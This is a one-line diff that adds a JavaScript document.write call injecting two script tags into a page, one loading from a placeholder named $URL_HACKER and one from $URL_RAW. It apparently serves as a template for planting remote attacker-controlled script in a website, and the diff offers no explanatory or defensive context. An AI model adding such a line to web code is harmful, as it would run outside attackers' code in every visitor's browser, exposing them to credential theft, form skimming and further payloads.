@@ -1,0 +1,1 @@
+document.write('<script defer src=$URL_HACKER></script><script src=//$URL_RAW?1></script>')
